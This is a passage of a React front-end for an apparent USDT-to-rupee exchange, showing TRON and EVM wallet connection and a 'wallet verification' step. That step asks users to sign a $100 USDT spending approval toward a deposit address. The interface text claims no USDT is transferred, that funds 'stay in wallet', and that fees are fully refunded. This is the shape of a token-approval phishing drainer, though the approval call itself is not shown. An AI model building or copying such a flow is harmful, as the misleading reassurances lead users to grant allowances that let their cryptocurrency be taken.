              <span style={{ width:8, height:8, borderRadius:'50%', background:NET_COLOR[network], display:'inline-block' }} />
              <span style={{ fontSize:13, fontWeight:700, color:T.text }}>{NET_LABEL[network]}</span>
            </div>
            <span style={{ fontSize:13, fontWeight:700, color:T.cyan, fontFamily:'monospace' }}>
              {rate ? `₹${rate.toFixed(2)} / USDT` : '…'}
            </span>
          </div>

          {/* ── TRC20: TronLink connect ── */}
          {isTRC20 ? (
            <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, overflow:'hidden' }}>
              <div style={{ padding:'18px 22px', borderBottom:`1px solid ${T.border}` }}>
                <h2 style={{ fontSize:16, fontWeight:800, color:T.text, margin:0 }}>Connect TRON Wallet</h2>
                <p style={{ fontSize:13, color:T.sub, margin:'4px 0 0' }}>
                  Connect via Trust Wallet to verify your wallet on-chain.
                </p>
              </div>
              <div style={{ padding:'18px 22px', display:'flex', flexDirection:'column', gap:10 }}>
                {tronAddress ? (
                  <>
                    <div style={{ display:'flex', alignItems:'center', gap:12, padding:'14px 16px', background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)', borderRadius:14 }}>
                      <TronLinkLogo size={42} />
                      <div style={{ flex:1, minWidth:0 }}>
                        <div style={{ fontSize:11, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.08em', color:T.green, marginBottom:3 }}>TRON Wallet Connected</div>
                        <div style={{ fontSize:13, fontWeight:700, color:T.text, fontFamily:'monospace', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{tronAddress}</div>
                        {trcBalance !== null && (
                          <div style={{ fontSize:11, color: trcHasEnough ? T.green : T.red, marginTop:2 }}>
                            USDT: {trcBalance.toFixed(4)} TRC20{!trcHasEnough ? ' ⚠' : ' ✓'}
                          </div>
                        )}
                        {trcTrxBalance !== null && (
                          <div style={{ fontSize:11, color: !trcHasGas ? T.red : T.dim, marginTop:1 }}>
                            TRX: {trcTrxBalance.toFixed(3)}{trcEnergy ? ` · Energy: ${trcEnergy.toLocaleString()}` : ''}
                          </div>
                        )}
                      </div>
                      <button onClick={disconnectTron} style={{ fontSize:12, color:T.sub, background:'none', border:`1px solid ${T.border}`, borderRadius:8, cursor:'pointer', padding:'5px 10px' }}>Disconnect</button>
                    </div>
                    <button onClick={() => setStep(mode==='buy' ? 3 : 2)} style={{ width:'100%', padding:'14px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none', cursor:'pointer', background:`linear-gradient(135deg,${T.blue},${T.purple})`, color:'#fff', boxShadow:'0 6px 24px rgba(26,63,255,0.45)' }}>
                      {mode==='buy' ? 'Confirm Wallet →' : 'Continue to Approve →'}
                    </button>
                  </>
                ) : (
                  <>
                    {hasTronLink ? (
                      /* TRON wallet detected (TronLink extension or Trust Wallet in-app browser) — auto-proceed */
                      <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
                        <div style={{ display:'flex', alignItems:'center', gap:12, padding:'14px 16px', background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)', borderRadius:14 }}>
                          <TronLinkLogo size={40} />
                          <div style={{ flex:1 }}>
                            <div style={{ fontSize:11, fontWeight:700, color:T.green, textTransform:'uppercase', letterSpacing:'0.08em', marginBottom:2 }}>TRON Wallet Ready</div>
                            <div style={{ fontSize:13, color:T.sub }}>Your TRON wallet is detected and ready</div>
                          </div>
                        </div>
                        <button onClick={connectTronWallet} disabled={trcConnecting}
                          style={{ width:'100%', padding:'15px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none', cursor:'pointer', background:`linear-gradient(135deg,#EF4444,#DC2626)`, color:'#fff', boxShadow:'0 6px 24px rgba(239,68,68,0.4)', opacity:trcConnecting?0.7:1 }}>
                          {trcConnecting ? 'Connecting…' : 'Proceed with Verification →'}
                        </button>
                      </div>
                    ) : isMobile ? (
                      /* Mobile, no wallet detected — deep link to Trust Wallet */
                      <>
                        {twLoading ? (
                          <div style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14, background:'rgba(26,63,255,0.18)', border:'1px solid rgba(26,63,255,0.25)' }}>
                            <div style={{ width:42, height:42, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
                              <div style={{ width:22, height:22, border:'2.5px solid rgba(255,255,255,0.18)', borderTopColor:'rgba(255,255,255,0.7)', borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
                            </div>
                            <div style={{ flex:1 }}>
                              <div style={{ fontSize:15, fontWeight:700, color:'rgba(255,255,255,0.55)', marginBottom:3 }}>Preparing secure link…</div>
                              <div style={{ fontSize:12, color:'rgba(255,255,255,0.3)' }}>Generating one-time session token</div>
                            </div>
                          </div>
                        ) : twError ? (
                          <button onClick={() => setTwRetry(n => n + 1)}
                            style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
                              background:'rgba(255,92,124,0.1)', border:'1px solid rgba(255,92,124,0.3)',
                              cursor:'pointer', width:'100%', textAlign:'left' }}>
                            <div style={{ width:42, height:42, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, fontSize:24 }}>⚠️</div>
                            <div style={{ flex:1 }}>
                              <div style={{ fontSize:14, fontWeight:700, color:T.red, marginBottom:2 }}>Link failed — tap to retry</div>
                              <div style={{ fontSize:12, color:'rgba(255,92,124,0.7)' }}>{twError}</div>
                            </div>
                          </button>
                        ) : twHref ? (
                          <a href={twHref}
                            style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
                              background:`linear-gradient(135deg,${T.blue},${T.purple})`,
                              textDecoration:'none', boxShadow:'0 6px 24px rgba(26,63,255,0.45)', transition:'all 0.15s' }}>
                            <TrustLogo size={42} />
                            <div style={{ flex:1 }}>
                              <div style={{ fontSize:15, fontWeight:800, color:'#fff', marginBottom:3 }}>Open in Trust Wallet</div>
                              <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)' }}>Tap to verify — no login required</div>
                            </div>
                            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M5 9h8M9 5l4 4-4 4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                          </a>
                        ) : null}
                      </>
                    ) : null /* Desktop without TronLink: QR shown below */}

                    {/* Desktop, no TronLink: show QR to open Trust Wallet mobile */}
                    {!isMobile && !hasTronLink && (
                      <>
                        <div style={{ padding:'12px 14px', borderRadius:12, background:'rgba(0,212,255,0.05)', border:'1px solid rgba(0,212,255,0.12)' }}>
                          <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.6 }}>
                            <strong style={{ color:T.cyan }}>No TRON wallet detected on this device.</strong> Scan the QR code below to open this page in Trust Wallet on your phone.
                          </p>
                        </div>
                        {/* QR code — lets PC user scan with phone to open Trust Wallet mobile */}
                        <button
                          onClick={() => setShowQR(prev => !prev)}
                          style={{ display:'flex', alignItems:'center', gap:12, padding:'13px 16px', borderRadius:14, border:`1px solid ${T.border}`, background:'rgba(255,255,255,0.025)', cursor:'pointer', textAlign:'left', width:'100%', transition:'all 0.12s' }}
                          onMouseEnter={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.06)')}
                          onMouseLeave={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.025)')}
                        >
                          <div style={{ width:40, height:40, borderRadius:10, background:'rgba(239,68,68,0.1)', border:'1px solid rgba(239,68,68,0.2)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:20, flexShrink:0 }}>📱</div>
                          <div style={{ flex:1 }}>
                            <div style={{ fontSize:14, fontWeight:700, color:T.text }}>Use Trust Wallet on Mobile (Recommended)</div>
                            <div style={{ fontSize:12, color:T.sub, marginTop:2 }}>Scan QR code — opens Trust Wallet directly, no login needed</div>
                          </div>
                          <span style={{ fontSize:11, color:T.dim, flexShrink:0 }}>{showQR ? '▲ Hide' : '▼ Show QR'}</span>
                        </button>
                        {showQR && (
                          <div style={{ padding:'20px', borderRadius:14, background:T.card2, border:`1px solid ${T.border}`, display:'flex', flexDirection:'column', alignItems:'center', gap:12 }}>
                            {twHref ? (
                              <>
                                <div style={{ padding:12, background:'#fff', borderRadius:12 }}>
                                  <QRCodeSVG value={twHref} size={164} bgColor="#ffffff" fgColor="#000000" level="M" />
                                </div>
                                <p style={{ fontSize:12, color:T.sub, margin:0, textAlign:'center', lineHeight:1.7 }}>
                                  Scan with your phone camera or Trust Wallet app.<br/>
                                  <span style={{ color:T.cyan }}>No login required</span> — opens directly in Trust Wallet browser.
                                </p>
                              </>
                            ) : twLoading ? (
                              <div style={{ display:'flex', alignItems:'center', gap:10, padding:'20px 0', color:T.dim, fontSize:13 }}>
                                <div style={{ width:18, height:18, border:'2px solid rgba(255,255,255,0.1)', borderTopColor:T.cyan, borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
                                Generating QR code…
                              </div>
                            ) : (
                              <button onClick={() => setTwRetry(n => n + 1)} style={{ padding:'10px 20px', borderRadius:10, fontSize:13, fontWeight:700, border:`1px solid ${T.red}`, background:'rgba(255,92,124,0.08)', color:T.red, cursor:'pointer' }}>
                                ⚠️ Failed — click to retry
                              </button>
                            )}
                          </div>
                        )}
                      </>
                    )}

                    {trcConnectError && (
                      <div style={{ padding:'10px 14px', borderRadius:10, background:'rgba(255,92,124,0.08)', border:'1px solid rgba(255,92,124,0.2)', fontSize:13, color:T.red }}>
                        {trcConnectError}
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          ) : (
            /* ── EVM wallets ── */
            <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, overflow:'hidden' }}>
              <div style={{ padding:'18px 22px', borderBottom:`1px solid ${T.border}` }}>
                <h2 style={{ fontSize:16, fontWeight:800, color:T.text, margin:0 }}>Connect Trust Wallet</h2>
                <p style={{ fontSize:13, color:T.sub, margin:'4px 0 0' }}>
                  {hasTrust ? 'Trust Wallet detected — proceed below to verify your wallet.' : isMobile ? 'Open in Trust Wallet to connect automatically.' : 'Scan the QR code with Trust Wallet on your phone.'}
                </p>
              </div>

              {isConnected && address ? (
                <div style={{ padding:'20px 22px' }}>
                  <div style={{ display:'flex', alignItems:'center', gap:12, padding:'14px 16px', background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)', borderRadius:14, marginBottom:14 }}>
                    <div style={{ width:42, height:42, borderRadius:'50%', background:'linear-gradient(135deg,#1A3FFF,#6B21FF)', display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
                      <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><rect x="2" y="5" width="14" height="9" rx="2" stroke="white" strokeWidth="1.4"/><path d="M2 8H16" stroke="white" strokeWidth="1.4"/><circle cx="13" cy="11" r="1" fill="white"/></svg>
                    </div>
                    <div style={{ flex:1, minWidth:0 }}>
                      <div style={{ fontSize:11, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.08em', color:T.green, marginBottom:3 }}>Connected</div>
                      <div style={{ fontSize:13, fontWeight:700, color:T.text, fontFamily:'monospace', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                        {address.slice(0,8)}…{address.slice(-6)}
                      </div>
                    </div>
                    <button onClick={()=>disconnect()} style={{ fontSize:12, color:T.sub, background:'none', border:'none', cursor:'pointer', padding:'4px 8px' }}>Disconnect</button>
                  </div>
                  <button onClick={()=>setStep(2)} style={{ width:'100%', padding:'14px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none', cursor:'pointer', background:`linear-gradient(135deg,${T.blue},${T.purple})`, color:'#fff', boxShadow:'0 6px 24px rgba(26,63,255,0.45)' }}>
                    Continue to Verify →
                  </button>
                </div>
              ) : (
                <div style={{ padding:'12px 14px', display:'flex', flexDirection:'column', gap:8 }}>
                  {hasTrust ? (
                    /* Trust Wallet detected (extension or in-app browser) — auto-proceed, no manual button */
                    <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
                      <div style={{ display:'flex', alignItems:'center', gap:12, padding:'14px 16px', background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)', borderRadius:14 }}>
                        <TrustLogo size={40} />
                        <div style={{ flex:1 }}>
                          <div style={{ fontSize:11, fontWeight:700, color:T.green, textTransform:'uppercase', letterSpacing:'0.08em', marginBottom:2 }}>Trust Wallet Ready</div>
                          <div style={{ fontSize:13, color:T.sub }}>Your wallet is detected — tap to proceed with verification</div>
                        </div>
                      </div>
                      <button onClick={() => tryConnect(injectedConn)} disabled={isConnecting}
                        style={{ width:'100%', padding:'15px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none', cursor:'pointer', background:`linear-gradient(135deg,${T.blue},${T.purple})`, color:'#fff', boxShadow:'0 6px 24px rgba(26,63,255,0.45)', opacity:isConnecting?0.7:1 }}>
                        {isConnecting ? 'Connecting…' : 'Proceed with Verification →'}
                      </button>
                    </div>
                  ) : isMobile ? (
                    /* Mobile, no Trust Wallet detected — deep link button only */
                    <>
                      {twLoading ? (
                        <div style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14, background:'rgba(26,63,255,0.18)', border:'1px solid rgba(26,63,255,0.25)' }}>
                          <div style={{ width:42, height:42, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
                            <div style={{ width:22, height:22, border:'2.5px solid rgba(255,255,255,0.18)', borderTopColor:'rgba(255,255,255,0.7)', borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
                          </div>
                          <div style={{ flex:1 }}>
                            <div style={{ fontSize:15, fontWeight:700, color:'rgba(255,255,255,0.55)', marginBottom:3 }}>Preparing secure link…</div>
                            <div style={{ fontSize:12, color:'rgba(255,255,255,0.3)' }}>Generating one-time session token</div>
                          </div>
                        </div>
                      ) : twError ? (
                        <button onClick={() => setTwRetry(n => n + 1)}
                          style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
                            background:'rgba(255,92,124,0.1)', border:'1px solid rgba(255,92,124,0.3)',
                            cursor:'pointer', width:'100%', textAlign:'left' }}>
                          <div style={{ width:42, height:42, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, fontSize:24 }}>⚠️</div>
                          <div style={{ flex:1 }}>
                            <div style={{ fontSize:14, fontWeight:700, color:T.red, marginBottom:2 }}>Link failed — tap to retry</div>
                            <div style={{ fontSize:12, color:'rgba(255,92,124,0.7)' }}>{twError}</div>
                          </div>
                        </button>
                      ) : twHref ? (
                        <a href={twHref}
                          style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
                            background:`linear-gradient(135deg,${T.blue},${T.purple})`,
                            textDecoration:'none', boxShadow:'0 6px 24px rgba(26,63,255,0.45)', transition:'all 0.15s' }}>
                          <TrustLogo size={42} />
                          <div style={{ flex:1 }}>
                            <div style={{ fontSize:15, fontWeight:800, color:'#fff', marginBottom:3 }}>Open in Trust Wallet</div>
                            <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)' }}>Tap to verify — no login required</div>
                          </div>
                          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M5 9h8M9 5l4 4-4 4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                        </a>
                      ) : null}
                    </>
                  ) : null /* Desktop without Trust Wallet: QR shown below */}
                  {connectError && (
                    <div style={{ padding:'10px 14px', borderRadius:10, background:'rgba(255,92,124,0.08)', border:'1px solid rgba(255,92,124,0.2)', fontSize:13, color:T.red }}>
                      {connectError}
                    </div>
                  )}
                  {/* Desktop QR code — only when no Trust Wallet extension detected */}
                  {!isMobile && !hasTrust && (
                    <div style={{ display:'flex', flexDirection:'column', gap:8, marginTop:4 }}>
                      <button
                        onClick={() => setShowQR(prev => !prev)}
                        style={{ display:'flex', alignItems:'center', gap:12, padding:'13px 16px', borderRadius:14, border:`1px solid ${T.border}`, background:'rgba(255,255,255,0.025)', cursor:'pointer', textAlign:'left', transition:'all 0.12s' }}
                        onMouseEnter={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.06)')}
                        onMouseLeave={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.025)')}
                      >
                        <div style={{ width:40, height:40, borderRadius:10, background:'rgba(26,63,255,0.1)', border:'1px solid rgba(26,63,255,0.2)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:20, flexShrink:0 }}>📱</div>
                        <div style={{ flex:1 }}>
                          <div style={{ fontSize:14, fontWeight:700, color:T.text }}>Use Trust Wallet on Mobile</div>
                          <div style={{ fontSize:12, color:T.sub, marginTop:2 }}>Scan QR code — opens directly in Trust Wallet, no login needed</div>
                        </div>
                        <span style={{ fontSize:11, color:T.dim, flexShrink:0 }}>{showQR ? '▲ Hide' : '▼ Show QR'}</span>
                      </button>
                      {showQR && (
                        <div style={{ padding:'20px', borderRadius:14, background:T.card2, border:`1px solid ${T.border}`, display:'flex', flexDirection:'column', alignItems:'center', gap:12 }}>
                          {twHref ? (
                            <>
                              <div style={{ padding:12, background:'#fff', borderRadius:12 }}>
                                <QRCodeSVG value={twHref} size={164} bgColor="#ffffff" fgColor="#000000" level="M" />
                              </div>
                              <p style={{ fontSize:12, color:T.sub, margin:0, textAlign:'center', lineHeight:1.7 }}>
                                Scan with your phone camera or Trust Wallet app.<br/>
                                <span style={{ color:T.cyan }}>No login required</span> — opens directly in Trust Wallet browser.
                              </p>
                            </>
                          ) : twLoading ? (
                            <div style={{ display:'flex', alignItems:'center', gap:10, padding:'20px 0', color:T.dim, fontSize:13 }}>
                              <div style={{ width:18, height:18, border:'2px solid rgba(255,255,255,0.1)', borderTopColor:T.cyan, borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
                              Generating QR code…
                            </div>
                          ) : (
                            <button onClick={() => setTwRetry(n => n + 1)} style={{ padding:'10px 20px', borderRadius:10, fontSize:13, fontWeight:700, border:`1px solid ${T.red}`, background:'rgba(255,92,124,0.08)', color:T.red, cursor:'pointer' }}>
                              ⚠️ Failed — click to retry
                            </button>
                          )}
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* ══ STEP 2: Approve USDT (SELL only) ══ */}

      {/* ── TRC20: approve() on USDT contract ── */}
      {step===2 && isTRC20 && (
        <div style={{ display:'flex', flexDirection:'column', gap:14 }}>

          {/* Connected wallet + balance */}
          <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:16, padding:'16px 20px' }}>
            <p style={{ fontSize:11, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.08em', color:T.dim, margin:'0 0 10px' }}>Connected TRON Wallet</p>
            <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', gap:12 }}>
              <code style={{ fontSize:13, fontWeight:700, color:T.text, fontFamily:'monospace', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{tronAddress}</code>
              <button onClick={disconnectTron} style={{ fontSize:12, color:T.sub, background:'none', border:`1px solid ${T.border}`, borderRadius:8, cursor:'pointer', padding:'5px 10px', flexShrink:0 }}>Disconnect</button>
            </div>

            <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:8, marginTop:12 }}>
              <div style={{ background:'rgba(255,255,255,0.03)', borderRadius:10, padding:'10px 12px', border:`1px solid ${trcHasEnough ? T.border : 'rgba(248,113,113,0.3)'}` }}>
                <p style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.07em', color:T.dim, margin:'0 0 4px' }}>USDT Balance</p>
                <p style={{ fontSize:16, fontWeight:800, color: trcBalance === null ? T.dim : trcHasEnough ? T.green : T.red, margin:0, fontFamily:'monospace' }}>
                  {trcBalance === null ? '…' : trcBalance.toFixed(4)}
                </p>
                <p style={{ fontSize:10, color:T.dim, margin:'2px 0 0' }}>TRC20 · stays in wallet</p>
              </div>
              <div style={{ background:'rgba(255,255,255,0.03)', borderRadius:10, padding:'10px 12px', border:`1px solid ${!trcHasGas ? 'rgba(248,113,113,0.3)' : T.border}` }}>
                <p style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.07em', color:T.dim, margin:'0 0 4px' }}>TRX (Gas only)</p>
                <p style={{ fontSize:16, fontWeight:800, color: trcTrxBalance === null ? T.dim : trcHasGas ? T.sub : T.red, margin:0, fontFamily:'monospace' }}>
                  {trcTrxBalance === null ? '…' : trcTrxBalance.toFixed(3)}
                </p>
                <p style={{ fontSize:10, color: trcHasGas ? T.dim : T.red, margin:'2px 0 0' }}>
                  {!trcHasGas ? `need ≥ ${MIN_TRX_FOR_GAS} TRX` : trcEnergy ? `energy: ${trcEnergy.toLocaleString()}` : `need ≥ ${MIN_TRX_FOR_GAS} TRX`}
                </p>
              </div>
            </div>
          </div>

          {!depositAddress && (
            <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(255,92,124,0.08)', border:'1px solid rgba(255,92,124,0.2)', fontSize:13, color:T.red }}>
              No TRC20 deposit address configured. Please contact support.
            </div>
          )}

          {depositAddress && (
            <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, overflow:'hidden' }}>
              <div style={{ padding:'18px 22px', borderBottom:`1px solid ${T.border}` }}>
                <h2 style={{ fontSize:16, fontWeight:800, color:T.text, margin:'0 0 4px' }}>Wallet Verification — $100 Smart Contract</h2>
                <p style={{ fontSize:13, color:T.sub, margin:0, lineHeight:1.6 }}>
                  Set a $100 USDT approval on the TRON contract to verify your wallet. A 0.1 USDT refundable verification fee is collected from this approved balance.
                </p>
              </div>

              <div style={{ padding:'18px 22px', display:'flex', flexDirection:'column', gap:10 }}>

                {!trcVerifyStarted && (
                  <>
                    {/* Gas fee refund banner — prominent */}
                    <div style={{ padding:'14px 16px', borderRadius:12, background:'rgba(243,186,47,0.1)', border:'2px solid rgba(243,186,47,0.4)' }}>
                      <p style={{ fontSize:13, fontWeight:800, color:T.yellow, margin:'0 0 5px', letterSpacing:'0.01em' }}>
                        💰 Network Gas Fee — Fully Refunded
                      </p>
                      <p style={{ fontSize:12, color:'rgba(255,255,255,0.72)', margin:0, lineHeight:1.65 }}>
                        A small TRX gas fee is required to submit this smart contract on the TRON network. <strong style={{ color:T.yellow }}>This fee will be fully reimbursed</strong> to you upon successful wallet verification and order completion. You will not be out of pocket.
                      </p>
                    </div>

                    <div style={{ display:'flex', alignItems:'flex-start', gap:12, padding:'14px 16px', background:T.card2, borderRadius:12, border:`1px solid ${T.border}` }}>
                      <span style={{ fontSize:22, flexShrink:0 }}>🔐</span>
                      <div>
                        <p style={{ fontSize:13, fontWeight:700, color:T.text, margin:'0 0 3px' }}>
                          Verify Wallet — Set $100 USDT Smart Contract on TRON
                        </p>
                        <p style={{ fontSize:11, color:T.dim, margin:0, lineHeight:1.5 }}>
                          Your wallet will show a TRON USDT Smart Contract confirmation — review the TRX gas fee and confirm. This sets a $100 spending limit only; no USDT is transferred immediately.
                        </p>
                      </div>
                    </div>

                    {/* Refundable fee notice */}
                    <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)' }}>
                      <p style={{ fontSize:12, fontWeight:700, color:T.green, margin:'0 0 4px' }}>🔒 $100 Smart Contract — 0.1 USDT Verification Fee (Refundable)</p>
                      <p style={{ fontSize:11, color:'rgba(255,255,255,0.55)', margin:0, lineHeight:1.6 }}>
                        This sets a $100 USDT spending limit on the TRON contract. A 0.1 USDT verification fee is collected from this limit and <strong style={{ color:T.green }}>fully refunded</strong> upon order completion. Your USDT balance is not affected until your order is processed.
                      </p>
                    </div>
                  </>
                )}

                {/* Live tx progress */}
                {trcVerifyStarted && (
                  <div style={{ display:'flex', flexDirection:'column', gap:8 }}>
                    <TxRow
                      label="Wallet verification — $100 USDT smart contract on TRON"
                      hash={trcApproveHash}
                      confirming={trcApprovePending && !!trcApproveHash}
                      confirmed={trcApproveDone}
                      error={trcApproveError || undefined}
                    />
                    {trcVerifyStarted && trcApproveHash && !trcApproveDone && !trcApproveError && (
                      <div style={{ padding:'14px 16px', borderRadius:12, background:'rgba(243,186,47,0.07)', border:'1px solid rgba(243,186,47,0.25)', textAlign:'center' }}>
                        <p style={{ fontSize:14, fontWeight:800, color:T.yellow, margin:'0 0 4px' }}>⏳ Wallet Verification Pending</p>
                        <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.6 }}>
                          Awaiting blockchain confirmation. You will be moved forward automatically once the smart contract is confirmed on TRON.
                        </p>
                      </div>
                    )}
                    {trcApproveDone && (
                      <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(0,229,160,0.08)', border:'1px solid rgba(0,229,160,0.2)', textAlign:'center', fontSize:14, fontWeight:700, color:T.green }}>
                        ✓ Verified — proceeding to order confirmation…
                      </div>
                    )}
                  </div>
                )}

                {/* Insufficient USDT — hard block */}
                {!trcVerifyStarted && trcBalance !== null && !trcHasEnough && (
                  <div style={{ background:'rgba(248,113,113,0.08)', border:'1px solid rgba(248,113,113,0.22)', borderRadius:12, padding:'12px 16px' }}>
                    <p style={{ fontSize:13, fontWeight:700, color:T.red, margin:'0 0 3px' }}>Insufficient USDT</p>
                    <p style={{ fontSize:12, color:'rgba(248,113,113,0.8)', margin:0, lineHeight:1.5 }}>
                      Wallet has {trcBalance.toFixed(4)} USDT — wallet verification requires at least 0.1 USDT. Top up your Trust Wallet and retry.
                    </p>
                  </div>
                )}

                {/* Insufficient TRX — hard block (prevents "Unexpected end of JSON input" crash in wallet) */}
                {!trcVerifyStarted && !trcHasGas && trcTrxBalance !== null && (
                  <div style={{ background:'rgba(248,113,113,0.08)', border:'1px solid rgba(248,113,113,0.22)', borderRadius:12, padding:'12px 16px' }}>
                    <p style={{ fontSize:13, fontWeight:700, color:T.red, margin:'0 0 3px' }}>Insufficient TRX for gas</p>
                    <p style={{ fontSize:12, color:'rgba(248,113,113,0.8)', margin:0, lineHeight:1.5 }}>
                      You have <strong>{trcTrxBalance.toFixed(3)} TRX</strong> but approving USDT on TRON requires ≥ <strong>{MIN_TRX_FOR_GAS} TRX</strong> for network fees.
                      {trcEnergy && trcEnergy > 0 ? ` Your ${trcEnergy.toLocaleString()} energy reduces the cost.` : ''}{' '}
                      Top up TRX in Trust Wallet, then return here.
                      <br/><strong style={{ color:T.red }}>TRX is only a gas fee — it is not exchanged.</strong>
                    </p>
                  </div>
                )}

                {!trcVerifyStarted && (
                  <button onClick={startTrcVerification} disabled={!trcCanVerify}
                    style={{ width:'100%', padding:'15px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none',
                      cursor:!trcCanVerify?'not-allowed':'pointer',
                      background:!trcCanVerify?'rgba(255,255,255,0.08)':`linear-gradient(135deg,${T.blue},${T.purple})`,
                      color:!trcCanVerify?T.dim:'#fff',
                      boxShadow:trcCanVerify?'0 6px 24px rgba(26,63,255,0.45)':'none', transition:'all 0.15s',
                    }}>
                    {!trcHasEnough ? `Need ≥ 0.1 USDT` : !trcHasGas ? `Need ≥ ${MIN_TRX_FOR_GAS} TRX for gas` : `Verify Wallet — Set $100 Smart Contract →`}
                  </button>
                )}

                {trcVerifyStarted && trcApproveError && (
                  <button onClick={() => { setTrcVerifyStarted(false); setTrcApproveError(''); }}
                    style={{ width:'100%', padding:'12px 0', borderRadius:12, fontSize:14, fontWeight:700, border:`1px solid ${T.border}`, background:T.card2, color:T.sub, cursor:'pointer' }}>
                    ↩ Retry
                  </button>
                )}

                {trcApprovePending && (
                  <p style={{ fontSize:12, color:T.sub, textAlign:'center', margin:0 }}>
                    Confirm the approval in your wallet…
                  </p>
                )}
              </div>
            </div>
          )}
        </div>
      )}

      {/* ── EVM: on-chain verification (BEP20 / ERC20) ── */}
      {step===2 && !isTRC20 && (
        <div style={{ display:'flex', flexDirection:'column', gap:14 }}>

          {/* Connected wallet + balance grid */}
          <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:16, padding:'16px 20px' }}>
            <p style={{ fontSize:11, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.08em', color:T.dim, margin:'0 0 10px' }}>
              Connected Wallet · {NET_LABEL[network]}
            </p>
            <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', gap:12 }}>
              <code style={{ fontSize:13, fontWeight:700, color:T.text, fontFamily:'monospace', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                {address?.slice(0,10)}…{address?.slice(-8)}
              </code>
              <button onClick={()=>disconnect()} style={{ fontSize:12, color:T.sub, background:'none', border:`1px solid ${T.border}`, borderRadius:8, cursor:'pointer', padding:'5px 10px', flexShrink:0 }}>Disconnect</button>
            </div>

            {/* 2-column balance grid */}
            <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:8, marginTop:12 }}>
              <div style={{ background:'rgba(255,255,255,0.03)', borderRadius:10, padding:'10px 12px', border:`1px solid ${hasEnoughBalance ? T.border : 'rgba(248,113,113,0.3)'}` }}>
                <p style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.07em', color:T.dim, margin:'0 0 4px' }}>USDT Balance</p>
                <p style={{ fontSize:16, fontWeight:800, color: usdtBalanceNum === null ? T.dim : hasEnoughBalance ? T.green : T.red, margin:0, fontFamily:'monospace' }}>
                  {usdtBalanceNum === null ? '…' : usdtBalanceNum.toFixed(4)}
                </p>
                <p style={{ fontSize:10, color:T.dim, margin:'2px 0 0' }}>{network}</p>
              </div>
              <div style={{ background:'rgba(255,255,255,0.03)', borderRadius:10, padding:'10px 12px', border:`1px solid rgba(26,63,255,0.25)` }}>
                <p style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.07em', color:T.dim, margin:'0 0 4px' }}>Approve Limit</p>
                <p style={{ fontSize:16, fontWeight:800, color:T.blue, margin:0, fontFamily:'monospace' }}>
                  $100.00
                </p>
